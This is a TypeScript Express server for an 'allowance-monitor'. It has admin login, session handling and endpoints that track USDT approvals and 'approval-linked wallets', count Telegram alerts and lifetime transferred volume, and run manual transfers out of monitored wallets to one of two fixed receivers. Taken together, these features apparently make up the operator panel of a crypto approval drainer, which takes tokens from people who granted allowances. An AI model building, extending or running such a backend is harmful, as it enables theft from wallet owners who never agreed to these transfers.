import crypto from "node:crypto";
import express from "express";
import cors from "cors";
import { ethers } from "ethers";
import { config } from "./config";
import { Store } from "./store";
import { ManualTransferError, WalletMonitor } from "./monitor";

const app = express();
app.use(cors());
app.use(express.json());
app.set("json replacer", (_key: string, value: unknown) =>
  typeof value === "bigint" ? value.toString() : value
);
const store = new Store();
const monitor = new WalletMonitor(store);
const address = ethers.getAddress;
const ADMIN_SESSION_IDLE_TIMEOUT_MS = 30 * 60 * 1000;
const ADMIN_SESSION_LIFETIME_MS = 8 * 60 * 60 * 1000;
const ADMIN_LOGIN_WINDOW_MS = 15 * 60 * 1000;
const ADMIN_LOGIN_MAX_FAILURES = 5;
const ADMIN_LOGIN_MAX_TRACKED_IPS = 10_000;
type AdminSession = { username: string; role: "admin"; issuedAt: string; lastSeen: string; expiresAt: number };
const adminSessions = new Map<string, AdminSession>();
const adminLoginFailures = new Map<string, { windowStartedAt: number; count: number }>();

const adminUsers = new Map([
  [config.ADMIN_1_USERNAME, config.ADMIN_1_PASSWORD],
  [config.ADMIN_2_USERNAME, config.ADMIN_2_PASSWORD]
]);

function pruneExpiredSessions(now: number) {
  for (const [token, session] of adminSessions) {
    if (session.expiresAt <= now || now - Date.parse(session.lastSeen) >= ADMIN_SESSION_IDLE_TIMEOUT_MS) {
      adminSessions.delete(token);
    }
  }
}

function loginRetryAfter(ip: string, now: number) {
  for (const [trackedIp, failures] of adminLoginFailures) {
    if (now - failures.windowStartedAt >= ADMIN_LOGIN_WINDOW_MS) {
      adminLoginFailures.delete(trackedIp);
    }
  }

  const failures = adminLoginFailures.get(ip);
  if (!failures || failures.count < ADMIN_LOGIN_MAX_FAILURES) return 0;
  return Math.ceil((ADMIN_LOGIN_WINDOW_MS - (now - failures.windowStartedAt)) / 1000);
}

function recordFailedLogin(ip: string, now: number) {
  const current = adminLoginFailures.get(ip);
  if (!current || now - current.windowStartedAt >= ADMIN_LOGIN_WINDOW_MS) {
    if (!current && adminLoginFailures.size >= ADMIN_LOGIN_MAX_TRACKED_IPS) {
      const oldestIp = adminLoginFailures.keys().next().value;
      if (oldestIp) adminLoginFailures.delete(oldestIp);
    }
    adminLoginFailures.set(ip, { windowStartedAt: now, count: 1 });
    return;
  }
  current.count += 1;
}

function requiredAdmin(req: express.Request, res: express.Response, next: express.NextFunction) {
  const header = req.headers.authorization ?? "";
  const token = header.startsWith("Bearer ") ? header.slice("Bearer ".length).trim() : "";
  if (!token) {
    res.status(401).json({ error: "Authentication required" });
    return;
  }

  const now = Date.now();
  pruneExpiredSessions(now);
  const session = adminSessions.get(token);
  if (!session) {
    res.status(401).json({ error: "Invalid or expired admin session" });
    return;
  }

  session.lastSeen = new Date(now).toISOString();
  (req as express.Request & { admin?: typeof session }).admin = session;
  next();
}

type AsyncRoute = (req: express.Request, res: express.Response, next: express.NextFunction) => Promise<void>;
const asyncRoute = (handler: AsyncRoute): express.RequestHandler => (req, res, next) => {
  void handler(req, res, next).catch(next);
};

app.get("/health", (_req, res) => res.json({ ok: true, service: "allowance-monitor" }));

app.post("/api/admin/login", (req, res) => {
  const now = Date.now();
  pruneExpiredSessions(now);
  const ip = req.ip || req.socket.remoteAddress || "unknown";
  const retryAfter = loginRetryAfter(ip, now);
  if (retryAfter > 0) {
    res.setHeader("Retry-After", String(retryAfter));
    res.status(429).json({ error: "Too many failed login attempts. Try again later." });
    return;
  }

  const username = String(req.body?.username ?? "");
  const password = String(req.body?.password ?? "");
  const correctPassword = adminUsers.get(username);
  const passwordMatches = correctPassword !== undefined && crypto.timingSafeEqual(
    crypto.createHash("sha256").update(password).digest(),
    crypto.createHash("sha256").update(correctPassword).digest()
  );

  if (!passwordMatches) {
    recordFailedLogin(ip, now);
    res.status(401).json({ error: "Invalid admin credentials" });
    return;
  }

  const token = crypto.randomBytes(32).toString("hex");
  const session = {
    username,
    role: "admin" as const,
    issuedAt: new Date(now).toISOString(),
    lastSeen: new Date(now).toISOString(),
    expiresAt: now + ADMIN_SESSION_LIFETIME_MS
  };
  adminSessions.set(token, session);
  adminLoginFailures.delete(ip);
  res.json({ ok: true, token, user: { username, role: "admin" }, issuedAt: session.issuedAt });
});

app.post("/api/admin/logout", requiredAdmin, (req, res) => {
  const auth = req.headers.authorization ?? "";
  const token = auth.startsWith("Bearer ") ? auth.slice("Bearer ".length).trim() : "";
  adminSessions.delete(token);
  res.json({ ok: true });
});

app.get("/api/admin/summary", requiredAdmin, (_req, res) => {
  const approvals = store.listApprovalEvents();
  const transfers = store.listTransferEvents();
  const wallets = store.listWallets();
  const monitoringState = store.getMonitoringState("Approval+Transfer");
  res.json({
    network: monitoringState.network,
    chainId: monitoringState.chainId,
    tokenContract: config.USDT_ADDRESS,
    monitoredApprovalWallets: store.listApprovalLinkedWallets().length,
    lifetimeTransferredVolume: {
      rawAmount: store.getLifetimeTransferredAmount(),
      decimals: store.getLifetimeTransferredDecimals(),
      tokenSymbol: "USDT"
    },
    recentApprovals: approvals.slice(0, 10),
    recentTransfers: transfers.slice(0, 10),
    wallets: wallets.slice(-10),
    monitoringStatus: {
      lastProcessedBlock: monitoringState.lastProcessedBlock,
      updatedAt: monitoringState.updatedAt
    },
    telegramStatus: {
      approvals: approvals.filter((item) => item.telegramStatus === "sent").length,
      transfers: transfers.filter((item) => item.telegramStatus === "sent").length,
      failed: approvals.filter((item) => item.telegramStatus === "failed").length + transfers.filter((item) => item.telegramStatus === "failed").length
    }
  });
});

app.get("/api/admin/approvals", requiredAdmin, (_req, res) => {
  res.json(store.listApprovalEvents().slice(0, 50));
});

app.get("/api/admin/transfers", requiredAdmin, (_req, res) => {
  res.json(store.listTransferEvents().slice(0, 50));
});

app.get("/api/admin/wallets", requiredAdmin, (_req, res) => {
  res.json(store.listWallets());
});

app.delete("/api/admin/wallets/:address", requiredAdmin, asyncRoute(async (req, res) => {
  const requestAddress = Array.isArray(req.params.address) ? req.params.address[0] : req.params.address;
  let normalizedAddress: string;
  try {
    normalizedAddress = address(requestAddress);
  } catch {
    res.status(400).json({ error: "Invalid wallet address" });
    return;
  }
  const wallet = await store.remove(normalizedAddress);
  if (!wallet) {
    res.status(404).json({ error: "Wallet not found" });
    return;
  }
  res.json(wallet);
}));

app.post("/api/admin/wallets/:address/transfers", requiredAdmin, asyncRoute(async (req, res) => {
  const requestAddress = Array.isArray(req.params.address) ? req.params.address[0] : req.params.address;
  let normalizedAddress: string;
  try {
    normalizedAddress = address(requestAddress);
  } catch {
    res.status(400).json({ error: "Invalid wallet address" });
    return;
  }

  const { amount, receiver } = req.body ?? {};
  if (typeof amount !== "string" || !/^\d+(?:\.\d+)?$/.test(amount)) {
    res.status(400).json({ error: "A valid USDT amount is required" });
    return;
  }
  if (receiver !== 1 && receiver !== 2) {
    res.status(400).json({ error: "Receiver must be 1 or 2" });
    return;
  }

  try {
    const history = await monitor.executeManualTransfer(normalizedAddress, receiver, amount);
    res.status(history.status === "failed" ? 502 : 200).json(history);
  } catch (error) {
    if (error instanceof ManualTransferError) {
      res.status(error.statusCode).json({ error: error.message });
      return;
    }
    throw error;
  }
}));

app.get("/api/admin/wallets/:address", requiredAdmin, (req, res) => {
  const requestAddress = Array.isArray(req.params.address) ? req.params.address[0] : req.params.address;
  try {
    const wallet = store.getWallet(address(requestAddress));
    if (!wallet || !store.hasVerifiedApprovalForWallet(wallet.address)) {
      return res.status(404).json({ error: "Verified wallet not found" });
    }
    const approvals = store.listApprovalEvents().filter((item) => item.walletAddress.toLowerCase() === wallet.address.toLowerCase());
    const transfers = store.listTransferEvents().filter((item) => item.walletAddress.toLowerCase() === wallet.address.toLowerCase());
    res.json({ wallet, approvals, transfers });
  } catch {
    res.status(400).json({ error: "Invalid wallet address" });
  }
});

app.get("/api/admin/history", requiredAdmin, (_req, res) => {
  res.json(store.history());
});

app.get("/api/admin/monitoring", requiredAdmin, (_req, res) => {
  res.json(store.getMonitoringState("Approval+Transfer"));
});

app.use((error: unknown, _req: express.Request, res: express.Response, next: express.NextFunction) => {
  console.error("API request failed:", error);
  if (res.headersSent) {
    next(error);
    return;
  }
  res.status(500).json({ error: "Internal server error" });
});

let server: ReturnType<typeof app.listen> | undefined;
async function start() {
  await store.initialize();
  server = app.listen(config.BACKEND_PORT, () => console.log(`API listening on http://localhost:${config.BACKEND_PORT}`));
  try {
    await monitor.start();
  } catch (error) {
    await new Promise<void>((resolve, reject) => {
      server?.close((closeError) => closeError ? reject(closeError) : resolve());
    });
    server = undefined;
    throw error;
  }
}

void start().catch((error) => {
  console.error("Backend failed to start:", error);
  process.exitCode = 1;
});
process.on("SIGTERM", () => {
  monitor.stop();
  server?.close();
});